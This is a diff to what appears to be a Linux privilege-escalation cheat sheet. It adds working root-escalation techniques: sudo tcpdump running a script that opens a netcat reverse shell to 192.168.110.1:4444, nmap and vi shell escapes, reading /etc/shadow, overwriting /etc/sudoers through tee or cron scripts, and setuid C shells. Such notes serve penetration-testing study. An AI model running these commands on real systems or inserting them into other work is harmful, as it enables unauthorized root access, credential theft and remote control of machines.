@@ -203,7 +203,7 @@ find / -perm -g=s -type f 2>/dev/null
 
 If you have a limited shell that has access to some programs using `sudo` you might be able to escalate your privileges with. Any program that can write or overwrite can be used. For example, if you have sudo-rights to `cp` you can overwrite `/etc/shadow` or `/etc/sudoers` with your own malicious file.
 
-`awk`
+##### awk
 
 ```
 awk 'BEGIN {system("/bin/bash")}'
@@ -211,10 +211,11 @@ awk 'BEGIN {system("/bin/bash")}'
 
 `bash`
 
-`cp`  
+##### cp
+
 Copy and overwrite /etc/shadow
 
-`find`
+##### find
 
 ```bash
 sudo find / -exec bash -i \;
@@ -226,7 +227,7 @@ find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
 
 The text/binary-editor HT.
 
-`less`
+##### less
 
 From less you can go into vi, and then into a shell.
 
@@ -236,7 +237,7 @@ v
 :shell
 ```
 
-`more`
+##### more
 
 You need to run more on a file that is bigger than your screen.
 
@@ -245,7 +246,7 @@ sudo more /home/pelle/myfile
 !/bin/bash
 ```
 
-`mv`
+##### mv
 
 Overwrite `/etc/shadow` or `/etc/sudoers`
 
@@ -255,9 +256,55 @@ Overwrite `/etc/shadow` or `/etc/sudoers`
 
 `nc`
 
-`nmap`
+##### tcpdump
 
-`python/perl/ruby/lua/etc`
+The “-z postrotate-command” option \(introduced in tcpdump version 4.0.0\).
+
+Create a temp.sh \( which contains the commands to executed as root \)
+
+```
+id
+/bin/nc 192.168.110.1 4444 -e /bin/bash
+```
+
+ Execute the command
+
+```
+sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z ./temp.sh -Z root
+```
+
+where
+
+```
+-C file_size : Before  writing a raw packet to a savefile, check whether the file is currently larger than file_size and, if so, close the current savefile and open a new one.  Savefiles after the first savefile will have the name specified with the -w flag, with a number after it, starting at 1 and continuing upward.  The units of file_size are millions of bytes (1,000,000 bytes, not 1,048,576 bytes).
+
+-W Used  in conjunction with the -C option, this will limit the number of files created to the specified number, and begin overwriting files from the beginning, thus creating a 'rotating' buffer.  In addition, it will name the files with enough leading 0s to support the maximum number of files, allowing them to sort correctly. Used in conjunction with the -G option, this will limit the number of rotated dump files that get created, exiting with status 0 when reaching the limit. If used with -C as well, the behavior will result in cyclical files per timeslice.
+
+-z postrotate-command Used in conjunction with the -C or -G options, this will make tcpdump run " postrotate-command file " where file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip will compress each savefile using gzip or bzip2.
+
+Note that tcpdump will run the command in parallel to the capture, using the lowest priority so that this doesn't disturb the capture process.
+
+And in case you would like to use a command that itself takes flags or different arguments, you can always write a shell script that will take the savefile name as the only argument, make the flags &  arguments arrangements and execute the command that you want.
+
+ -Z user
+ --relinquish-privileges=user If tcpdump is running as root, after opening the capture device or input savefile, but before opening any savefiles for output, change the user ID to user and the group ID to the primary group of user.
+
+ This behavior can also be enabled by default at compile time.
+```
+
+##### nmap
+
+```
+nmap --script <(echo 'require "os".execute "/bin/sh"')
+```
+
+or
+
+```
+nmap --interactive
+```
+
+##### python/perl/ruby/lua/etc
 
 ```
 sudo perl
@@ -273,7 +320,7 @@ os.system("/bin/bash")
 
 `sh`
 
-`tcpdump`
+##### tcpdump
 
 ```
 echo $'id\ncat /etc/shadow' > /tmp/.test
@@ -281,7 +328,7 @@ chmod +x /tmp/.test
 sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
 ```
 
-`vi/vim`
+##### vi/vim
 
 Can be abused like this:
 
@@ -292,6 +339,29 @@ sudo vi
 :set shell=/bin/bash:shell    
 :!bash
 ```
+
+##### tee
+
+If tee is suid: tee is used to read input and then write it to output and files. That means we can use tee to read our own commands and add them to any\_script.sh, which can then be run as root by a user. If some script is run as root, you may also run. For example, let’s say tidy.sh is executed as root on the server, we can write the below code in temp.sh
+
+```
+temp.sh
+echo "example_user ALL=(ALL) ALL" > /etc/sudoers
+```
+
+or
+
+```
+chmod +w /etc/sudoers to add write properties to sudoers file to do the above
+```
+
+and then
+
+```
+cat temp.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
+```
+
+ which will add contents of temp.sh to tidyup.sh. \( Assuming tidyup.sh is running as root by crontab \)
 
 [How I got root with sudo/](https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/)
 
@@ -343,6 +413,26 @@ cat /etc/cron.deny
 cat /etc/crontab
 cat /etc/anacrontab
 cat /var/spool/cron/crontabs/root
+```
+
+#### Cron.d
+
+Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.
+
+**Suid.c**
+
+```
+int main(void) {
+setgid(0); setuid(0);
+execl(“/bin/sh”,”sh”,0); }
+```
+
+or
+
+```
+int main(void) {
+setgid(0); setuid(0);
+system("/bin/bash"); }
 ```
 
 ### Unmounted filesystems
